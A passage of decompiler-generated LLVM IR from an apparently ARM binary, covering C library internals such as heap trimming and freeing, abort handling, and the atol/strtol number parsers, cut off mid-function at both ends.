  %v0_129f0 = phi i32 [ %v1_12920, %dec_label_pc_12914 ], [ %v2_12960, %dec_label_pc_12958 ]
  %v0_12974 = phi i32 [ %v3_12928, %dec_label_pc_12914 ], [ %v0_12974.pre, %dec_label_pc_12958 ]
  %v1_12988 = phi i32 [ %v2_12920, %dec_label_pc_12914 ], [ %v0_12970.pre, %dec_label_pc_12958 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12968 = load i32, i32* @r7, align 4
  %v2_12968 = add i32 %v0_12968, 64
  %v3_12968 = inttoptr i32 %v2_12968 to i32*
  %v4_12968 = load i32, i32* %v3_12968, align 4
  store i32 %v4_12968, i32* %r2.global-to-local, align 4
  %v1_1296c = add i32 %v4_12968, 44
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  %v3_1296c = load i32, i32* %v2_1296c, align 4
  store i32 %v3_1296c, i32* %r3.global-to-local, align 4
  %v9_12970 = icmp eq i32 %v1_12988, %v3_1296c
  %v1_12974 = and i32 %v0_12974, -4
  store i32 %v1_12974, i32* %r0.global-to-local, align 4
  br i1 %v9_12970, label %dec_label_pc_129f0, label %dec_label_pc_1297c

dec_label_pc_1297c:                               ; preds = %dec_label_pc_12964
  %v2_1297c = add i32 %v1_12988, %v1_12974
  store i32 %v2_1297c, i32* %r3.global-to-local, align 4
  %v1_12980 = add i32 %v2_1297c, 4
  %v2_12980 = inttoptr i32 %v1_12980 to i32*
  %v3_12980 = load i32, i32* %v2_12980, align 4
  store i32 %v3_12980, i32* %r3.global-to-local, align 4
  %v1_12984 = urem i32 %v3_12980, 2
  %v2_12984 = icmp eq i32 %v1_12984, 0
  %v2_12988 = add i32 %v1_12988, 4
  %v3_12988 = inttoptr i32 %v2_12988 to i32*
  store i32 %v1_12974, i32* %v3_12988, align 4
  br i1 %v2_12984, label %dec_label_pc_12990, label %dec_label_pc_1297c.dec_label_pc_129c0_crit_edge

dec_label_pc_1297c.dec_label_pc_129c0_crit_edge:  ; preds = %dec_label_pc_1297c
  %v0_129d0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129c0

dec_label_pc_12990:                               ; preds = %dec_label_pc_1297c
  %v0_12990 = load i32, i32* %lr.global-to-local, align 4
  %v1_12990 = add i32 %v0_12990, 8
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %r1.global-to-local, align 4
  %v1_12994 = add i32 %v3_12990, 12
  %v2_12994 = inttoptr i32 %v1_12994 to i32*
  %v3_12994 = load i32, i32* %v2_12994, align 4
  store i32 %v3_12994, i32* %r3.global-to-local, align 4
  %v9_12998 = icmp eq i32 %v3_12994, %v0_12990
  %v1_1299c = add i32 %v0_12990, 12
  %v2_1299c = inttoptr i32 %v1_1299c to i32*
  %v3_1299c = load i32, i32* %v2_1299c, align 4
  store i32 %v3_1299c, i32* %r2.global-to-local, align 4
  br i1 %v9_12998, label %dec_label_pc_129a4, label %dec_label_pc_129b0

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12990
  %v1_129a4 = add i32 %v3_1299c, 8
  %v2_129a4 = inttoptr i32 %v1_129a4 to i32*
  %v3_129a4 = load i32, i32* %v2_129a4, align 4
  store i32 %v3_129a4, i32* %r3.global-to-local, align 4
  %v9_129a8 = icmp eq i32 %v3_129a4, %v0_12990
  br i1 %v9_129a8, label %dec_label_pc_129b4, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_12990, %dec_label_pc_1294c, %dec_label_pc_12930, %dec_label_pc_129a4
  %v0_129b0 = call i32 @abort()
  store i32 %v0_129b0, i32* %r0.global-to-local, align 4
  %v0_129b4.pre = load i32, i32* @r1, align 4
  %v1_129b4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_129b4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129a4, %dec_label_pc_129b0
  %v1_129b4 = phi i32 [ %v3_1299c, %dec_label_pc_129a4 ], [ %v1_129b4.pre, %dec_label_pc_129b0 ]
  %v0_129b4 = phi i32 [ %v3_12990, %dec_label_pc_129a4 ], [ %v0_129b4.pre, %dec_label_pc_129b0 ]
  %v2_129b4 = add i32 %v1_129b4, 8
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 %v0_129b4, i32* %v3_129b4, align 4
  %v0_129b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_129b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_129b8 = add i32 %v1_129b8, 12
  %v3_129b8 = inttoptr i32 %v2_129b8 to i32*
  store i32 %v0_129b8, i32* %v3_129b8, align 4
  %v0_129bc = load i32, i32* %ip.global-to-local, align 4
  %v1_129bc = load i32, i32* %r0.global-to-local, align 4
  %v2_129bc = add i32 %v1_129bc, %v0_129bc
  store i32 %v2_129bc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_1297c.dec_label_pc_129c0_crit_edge, %dec_label_pc_129b4
  %v0_129d0 = phi i32 [ %v0_129d0.pre, %dec_label_pc_1297c.dec_label_pc_129c0_crit_edge ], [ %v2_129bc, %dec_label_pc_129b4 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_129c4 = load i32, i32* @r7, align 4
  %v2_129c4 = add i32 %v0_129c4, 64
  %v3_129c4 = inttoptr i32 %v2_129c4 to i32*
  %v4_129c4 = load i32, i32* %v3_129c4, align 4
  %v1_129c8 = add i32 %v4_129c4, 52
  store i32 %v1_129c8, i32* %r3.global-to-local, align 4
  %v1_129cc = add i32 %v4_129c4, 60
  %v2_129cc = inttoptr i32 %v1_129cc to i32*
  %v3_129cc = load i32, i32* %v2_129cc, align 4
  store i32 %v3_129cc, i32* %r1.global-to-local, align 4
  %v1_129d0 = or i32 %v0_129d0, 1
  store i32 %v1_129d0, i32* %r2.global-to-local, align 4
  %v1_129d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_129d4 = add i32 %v1_129d4, 12
  %v3_129d4 = inttoptr i32 %v2_129d4 to i32*
  store i32 %v1_129c8, i32* %v3_129d4, align 4
  %v0_129d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_129d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_129d8 = add i32 %v1_129d8, 8
  %v3_129d8 = inttoptr i32 %v2_129d8 to i32*
  store i32 %v0_129d8, i32* %v3_129d8, align 4
  %v0_129dc = load i32, i32* %r2.global-to-local, align 4
  %v1_129dc = load i32, i32* %r4.global-to-local, align 4
  %v2_129dc = add i32 %v1_129dc, 4
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  store i32 %v0_129dc, i32* %v3_129dc, align 4
  %v0_129e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_129e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_129e0 = add i32 %v1_129e0, %v0_129e0
  %v4_129e0 = inttoptr i32 %v3_129e0 to i32*
  store i32 %v0_129e0, i32* %v4_129e0, align 4
  %v0_129e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_129e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_129e4 = add i32 %v1_129e4, 12
  %v3_129e4 = inttoptr i32 %v2_129e4 to i32*
  store i32 %v0_129e4, i32* %v3_129e4, align 4
  %v0_129e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_129e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_129e8 = add i32 %v1_129e8, 8
  %v3_129e8 = inttoptr i32 %v2_129e8 to i32*
  store i32 %v0_129e8, i32* %v3_129e8, align 4
  br label %dec_label_pc_12a00

dec_label_pc_129f0:                               ; preds = %dec_label_pc_12964
  %v2_129f0 = add i32 %v1_12974, %v0_129f0
  store i32 %v2_129f0, i32* %ip.global-to-local, align 4
  %v1_129f4 = or i32 %v2_129f0, 1
  store i32 %v1_129f4, i32* %r3.global-to-local, align 4
  %v0_129f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_129f8, i32* %v2_1296c, align 4
  %v0_129fc = load i32, i32* %r3.global-to-local, align 4
  %v1_129fc = load i32, i32* %r4.global-to-local, align 4
  %v2_129fc = add i32 %v1_129fc, 4
  %v3_129fc = inttoptr i32 %v2_129fc to i32*
  store i32 %v0_129fc, i32* %v3_129fc, align 4
  br label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129c0, %dec_label_pc_129f0
  %v0_12a00 = load i32, i32* %ip.global-to-local, align 4
  %v3_12a04 = icmp ult i32 %v0_12a00, 131070
  br i1 %v3_12a04, label %dec_label_pc_12a70, label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_12a00
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12a0c = load i32, i32* @r7, align 4
  %v2_12a0c = add i32 %v0_12a0c, 64
  %v3_12a0c = inttoptr i32 %v2_12a0c to i32*
  %v4_12a0c = load i32, i32* %v3_12a0c, align 4
  store i32 %v4_12a0c, i32* @r4, align 4
  %v1_12a10 = inttoptr i32 %v4_12a0c to i32*
  %v2_12a10 = load i32, i32* %v1_12a10, align 4
  store i32 %v2_12a10, i32* %r3.global-to-local, align 4
  %v1_12a14 = and i32 %v2_12a10, 2
  %v2_12a14 = icmp eq i32 %v1_12a14, 0
  br i1 %v2_12a14, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12a08
  store i32 %v4_12a0c, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12a08, %bb
  %v1_12a1c = xor i1 %v2_12a14, true
  call void @__pseudo_cond_branch(i1 %v1_12a1c, i32 ptrtoint (i32* @global_var_126c0.450 to i32))
  %v0_12a20 = load i32, i32* @r4, align 4
  %v1_12a20 = add i32 %v0_12a20, 44
  %v2_12a20 = inttoptr i32 %v1_12a20 to i32*
  %v3_12a20 = load i32, i32* %v2_12a20, align 4
  store i32 %v3_12a20, i32* %r3.global-to-local, align 4
  %v1_12a24 = add i32 %v3_12a20, 4
  %v2_12a24 = inttoptr i32 %v1_12a24 to i32*
  %v3_12a24 = load i32, i32* %v2_12a24, align 4
  store i32 %v3_12a24, i32* %r3.global-to-local, align 4
  %v1_12a28 = add i32 %v0_12a20, 836
  %v2_12a28 = inttoptr i32 %v1_12a28 to i32*
  %v3_12a28 = load i32, i32* %v2_12a28, align 4
  store i32 %v3_12a28, i32* %r2.global-to-local, align 4
  %v1_12a2c = and i32 %v3_12a24, -4
  store i32 %v1_12a2c, i32* %r3.global-to-local, align 4
  %v3_12a30 = icmp ult i32 %v1_12a2c, %v3_12a28
  br i1 %v3_12a30, label %dec_label_pc_12a70, label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %bb16
  store i32 %v0_12a20, i32* %r1.global-to-local, align 4
  %v1_12a3c = add i32 %v0_12a20, 840
  %v2_12a3c = inttoptr i32 %v1_12a3c to i32*
  %v3_12a3c = load i32, i32* %v2_12a3c, align 4
  store i32 %v3_12a3c, i32* %r0.global-to-local, align 4
  %v2_12a40 = call i32 @__malloc_trim(i32 %v3_12a3c, i32 %v0_12a20)
  store i32 %v2_12a40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a70

dec_label_pc_12a48:                               ; preds = %dec_label_pc_1290c
  %v2_12a48 = inttoptr i32 %v1_128dc to i32*
  %v3_12a48 = load i32, i32* %v2_12a48, align 4
  store i32 %v3_12a48, i32* %r0.global-to-local, align 4
  %v1_12a4c = add i32 %v4_128cc, 848
  %v2_12a4c = inttoptr i32 %v1_12a4c to i32*
  %v3_12a4c = load i32, i32* %v2_12a4c, align 4
  store i32 %v3_12a4c, i32* %r2.global-to-local, align 4
  %v1_12a50 = add i32 %v4_128cc, 868
  %v2_12a50 = inttoptr i32 %v1_12a50 to i32*
  %v3_12a50 = load i32, i32* %v2_12a50, align 4
  %v2_12a54 = add i32 %v3_12a48, %v1_128d8
  store i32 %v2_12a54, i32* %r1.global-to-local, align 4
  %v1_12a58 = add i32 %v3_12a4c, -1
  store i32 %v1_12a58, i32* %r2.global-to-local, align 4
  %v2_12a5c = sub i32 %v3_12a50, %v2_12a54
  store i32 %v2_12a5c, i32* %r3.global-to-local, align 4
  store i32 %v2_12a5c, i32* %v2_12a50, align 4
  %v1_12a64 = load i32, i32* @lr, align 4
  %v2_12a64 = add i32 %v1_12a64, 848
  %v3_12a64 = inttoptr i32 %v2_12a64 to i32*
  store i32 %v1_12a58, i32* %v3_12a64, align 4
  %v0_12a68 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a68 = load i32, i32* @r5, align 4
  %v2_12a68 = sub i32 %v1_12a68, %v0_12a68
  store i32 %v2_12a68, i32* %r0.global-to-local, align 4
  %v4_12a6c = call i32 @munmap(i32 %v2_12a68, i32 %v2_12a54, i32 %v1_12a58, i32 %v2_12a5c)
  store i32 %v4_12a6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a70

dec_label_pc_12a70:                               ; preds = %bb16, %dec_label_pc_12a00, %dec_label_pc_12a38, %dec_label_pc_128ec, %dec_label_pc_12a48
  store i32 %v2_12880, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12a7c = load i32, i32* @r7, align 4
  %v2_12a7c = add i32 %v0_12a7c, 44
  %v3_12a7c = inttoptr i32 %v2_12a7c to i32*
  %v4_12a7c = load i32, i32* %v3_12a7c, align 4
  store i32 %v4_12a7c, i32* %ip.global-to-local, align 4
  store i32 76424, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12a7c)
  br label %dec_label_pc_12a88

dec_label_pc_12a88:                               ; preds = %entry, %dec_label_pc_12a70
  store i32 %v3_12874, i32* @r4, align 4
  store i32 %v6_12874, i32* @r5, align 4
  store i32 %v9_12874, i32* @r6, align 4
  store i32 %v12_12874, i32* @r7, align 4
  store i32 %v18_12874, i32* @lr, align 4
  ret i32 %v2_12880

; uselistorder directives
  uselistorder i32 %v0_12a20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_129e0, { 1, 0 }
  uselistorder i32 %v1_12920, { 1, 0 }
  uselistorder i32 %v0_12920, { 1, 0 }
  uselistorder i32 %v3_128f4, { 1, 0 }
  uselistorder i32 %v1_128d8, { 1, 0, 2 }
  uselistorder i32 %v2_128d4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_128cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1287c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12a88, { 1, 0 }
  uselistorder label %dec_label_pc_12a70, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_12a00, { 1, 0 }
  uselistorder label %dec_label_pc_129c0, { 1, 0 }
  uselistorder label %dec_label_pc_129b4, { 1, 0 }
  uselistorder label %dec_label_pc_129b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12964, { 1, 0 }
}

define i32 @function_12a98(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a98:
  %v0_12a98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a98, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12a98
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12a98, %bb
  %v4_12aac = phi i32 [ %arg1, %dec_label_pc_12a98 ], [ 0, %bb ]
  ret i32 %v4_12aac

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12ab0 = load i32, i32* @r4, align 4
  store i32 %v3_12ab0, i32* %stack_var_-12, align 4
  %v6_12ab0 = load i32, i32* @r5, align 4
  %v9_12ab0 = load i32, i32* @lr, align 4
  %v4_12ac0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_12ac0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_12ac0, i32* @r0, align 4
  %v0_12ad0 = call i32 @__malloc_consolidate()
  %v0_12ad4 = load i32, i32* @r4, align 4
  %v0_12ad8 = load i32, i32* @r5, align 4
  %v2_12ae0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12ae0, i32* @r4, align 4
  store i32 %v6_12ab0, i32* @r5, align 4
  store i32 %v9_12ab0, i32* @lr, align 4
  %v2_12ae4 = call i32 @__malloc_trim(i32 %v0_12ad4, i32 %v0_12ad8)
  %v0_12ae8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ae8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_12ae8 = load i32, i32* @lr, align 4
  %v3_12ae8 = inttoptr i32 %v2_12ae4 to i32*
  store i32 %v1_12ae8, i32* %v3_12ae8, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_12aec = phi i32 [ %v2_12ae4, %entry ], [ 0, %bb ]
  ret i32 %v4_12aec

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r5, align 4
  %v4_12b08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 16) to i32*), align 4
  store i32 76564, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b08)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_12b30 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_12b38 = load i32, i32* @r5, align 4
  %v2_12b38 = add i32 %v0_12b38, 628
  %v3_12b38 = inttoptr i32 %v2_12b38 to i32*
  %v4_12b38 = load i32, i32* %v3_12b38, align 4
  %v2_12b3c = icmp eq i32 %v4_12b38, 0
  br i1 %v2_12b3c, label %dec_label_pc_12b44, label %dec_label_pc_12b84

dec_label_pc_12b44:                               ; preds = %entry
  store i32 1, i32* %v3_12b38, align 4
  br label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12b94, %dec_label_pc_12b44
  %v0_12b50 = load i32, i32* @r5, align 4
  %v2_12b50 = add i32 %v0_12b50, 208
  store i32 %v2_12b50, i32* @r4, align 4
  %v2_12b5c = add i32 %v0_12b50, 68
  %v3_12b5c = inttoptr i32 %v2_12b5c to i32*
  %v4_12b5c = load i32, i32* %v3_12b5c, align 4
  call void @__pseudo_branch(i32 %v4_12b5c)
  %v1_12b6c = call i32 @__GI_raise(i32 6)
  %v0_12b78 = load i32, i32* @r5, align 4
  %v2_12b78 = add i32 %v0_12b78, 16
  %v3_12b78 = inttoptr i32 %v2_12b78 to i32*
  %v4_12b78 = load i32, i32* %v3_12b78, align 4
  store i32 76676, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b78)
  %v0_12b88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12b84

dec_label_pc_12b84:                               ; preds = %entry, %dec_label_pc_12b4c
  %v1_12b9c = phi i32 [ %v0_12b38, %entry ], [ %v0_12b88.pre, %dec_label_pc_12b4c ]
  %v2_12b88 = add i32 %v1_12b9c, 628
  %v3_12b88 = inttoptr i32 %v2_12b88 to i32*
  %v4_12b88 = load i32, i32* %v3_12b88, align 4
  %v7_12b8c = icmp eq i32 %v4_12b88, 1
  br i1 %v7_12b8c, label %dec_label_pc_12b94, label %dec_label_pc_12bd0

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b84
  %v2_12b94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12b94, i32* @r4, align 4
  store i32 2, i32* %v3_12b88, align 4
  %v3_12bac = bitcast i32* %stack_var_-28 to i8*
  %v4_12bac = call i32 @__GI_memset(i8* %v3_12bac, i32 0, i32 20)
  %v3_12bc8 = call i32 @__libc_sigaction(i32 6, i32 %v2_12b94, i32 0)
  br label %dec_label_pc_12b4c

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12b84
  %v7_12bd0 = icmp eq i32 %v4_12b88, 2
  br i1 %v7_12bd0, label %dec_label_pc_12bd8, label %dec_label_pc_12be4

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bd0
  store i32 3, i32* %v3_12b88, align 4
  %v0_12be0 = call i32 @abort()
  %v0_12be4.pre = load i32, i32* @r5, align 4
  %v1_12be4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12be4

dec_label_pc_12be4:                               ; preds = %dec_label_pc_12bd0, %dec_label_pc_12bd8
  %v3_12bf0 = phi i32 [ 628, %dec_label_pc_12bd0 ], [ %v1_12be4.pre, %dec_label_pc_12bd8 ]
  %v2_12bf0 = phi i32 [ %v1_12b9c, %dec_label_pc_12bd0 ], [ %v0_12be4.pre, %dec_label_pc_12bd8 ]
  %v2_12be4 = add i32 %v2_12bf0, %v3_12bf0
  %v3_12be4 = inttoptr i32 %v2_12be4 to i32*
  %v4_12be4 = load i32, i32* %v3_12be4, align 4
  %v7_12be8 = icmp eq i32 %v4_12be4, 3
  br i1 %v7_12be8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12be4
  store i32 4, i32* %v3_12be4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12be4, %bb
  call void @__pseudo_cond_branch(i1 %v7_12be8, i32 ptrtoint (i32* @global_var_147d0.459 to i32))
  br label %dec_label_pc_12bfc

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bfc, %.thread2
  %v0_12bfc = call i32 @abort()
  br label %dec_label_pc_12bfc

; uselistorder directives
  uselistorder i32* %v3_12b88, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12be4, { 1, 0 }
  uselistorder label %dec_label_pc_12b84, { 1, 0 }
}

define i32 @function_12c08(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c08:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_12c08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12c08
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12c08, %bb
  %v4_12c14 = phi i32 [ %tmp, %dec_label_pc_12c08 ], [ 0, %bb ]
  ret i32 %v4_12c14

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12c28 = call i32 @strtol()
  ret i32 %v0_12c28
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_12c44 = call i32 @_stdlib_strto_l()
  ret i32 %v0_12c44
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v0_12c68 = load i32, i32* @r1, align 4
  store i32 %v0_12c68, i32* %sb.global-to-local, align 4
  %v0_12c6c = load i32, i32* @r2, align 4
  store i32 %v0_12c6c, i32* %r5.global-to-local, align 4
  %v0_12c70 = load i32, i32* @r0, align 4
  store i32 %v0_12c70, i32* %r4.global-to-local, align 4
  %v0_12c74 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12c80

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c80
  %v1_12c7c = add i32 %v0_12cb8, 1
  store i32 %v1_12c7c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %entry, %dec_label_pc_12c7c
  %v0_12cb8 = phi i32 [ %v0_12c70, %entry ], [ %v1_12c7c, %dec_label_pc_12c7c ]
  %v1_12c80 = inttoptr i32 %v0_12cb8 to i8*
  %v2_12c80 = load i8, i8* %v1_12c80, align 1
  %v3_12c80 = zext i8 %v2_12c80 to i32
  store i32 %v3_12c80, i32* %r1.global-to-local, align 4
  %v4_12c84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 272) to i32*), align 4
  %v2_12c88 = mul nuw nsw i32 %v3_12c80, 2
  %v2_12c8c = add i32 %v2_12c88, %v4_12c84
  %v3_12c8c = inttoptr i32 %v2_12c8c to i16*
  %v4_12c8c = load i16, i16* %v3_12c8c, align 2
  %v1_12c90 = and i16 %v4_12c8c, 32
  %v2_12c90 = icmp eq i16 %v1_12c90, 0
  br i1 %v2_12c90, label %dec_label_pc_12c98, label %dec_label_pc_12c7c

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c80
  %v7_12c98 = icmp eq i8 %v2_12c80, 43
  br i1 %v7_12c98, label %dec_label_pc_12cb8, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c98
  %v7_12ca0 = icmp eq i8 %v2_12c80, 45
  br i1 %v7_12ca0, label %dec_label_pc_12cb8, label %bb

bb:                                               ; preds = %dec_label_pc_12ca0
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c98, %dec_label_pc_12ca0
  %storemerge47 = phi i32 [ 1, %dec_label_pc_12ca0 ], [ 0, %dec_label_pc_12c98 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_12cb8 = add i32 %v0_12cb8, 1
  store i32 %v1_12cb8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %bb, %dec_label_pc_12cb8
  %v0_12cdc = phi i32 [ %v0_12cb8, %bb ], [ %v1_12cb8, %dec_label_pc_12cb8 ]
  %v1_12cbc = and i32 %v0_12c6c, -17
  %v3_12cbc = icmp eq i32 %v1_12cbc, 0
  br i1 %v3_12cbc, label %dec_label_pc_12cc8, label %bb60

bb60:                                             ; preds = %dec_label_pc_12cbc
  br label %bb64

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12cbc
  %v1_12cc8 = inttoptr i32 %v0_12cdc to i8*
  %v2_12cc8 = load i8, i8* %v1_12cc8, align 1
  %v7_12ccc = icmp eq i8 %v2_12cc8, 48
  %v1_12cd0 = add i32 %v0_12c6c, 10
  store i32 %v1_12cd0, i32* %r5.global-to-local, align 4
  br i1 %v7_12ccc, label %dec_label_pc_12cdc, label %bb61

bb61:                                             ; preds = %dec_label_pc_12cc8
  br label %.thread8

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cc8
  %v1_12cdc = add i32 %v0_12cdc, 1
  %v2_12cdc = inttoptr i32 %v1_12cdc to i8*
  %v3_12cdc = load i8, i8* %v2_12cdc, align 1
  %v4_12cdc = zext i8 %v3_12cdc to i32
  store i32 %v1_12cdc, i32* %r4.global-to-local, align 4
  %v1_12ce0 = or i32 %v4_12cdc, 32
  %v7_12ce4 = icmp eq i32 %v1_12ce0, 120
  %v1_12ce8 = add i32 %v0_12c6c, 8
  store i32 %v1_12ce8, i32* %r5.global-to-local, align 4
  br i1 %v7_12ce4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_12cdc
  %v3_12cf4 = mul i32 %v1_12ce8, 2
  store i32 %v3_12cf4, i32* %r5.global-to-local, align 4
  %v2_12cf8 = add i32 %v0_12cdc, 2
  store i32 %v2_12cf8, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12cdc, %bb61, %bb62
  %v1_12dcc30 = phi i32 [ %v0_12c70, %bb61 ], [ %v1_12cdc, %bb62 ], [ %v1_12cdc, %dec_label_pc_12cdc ]
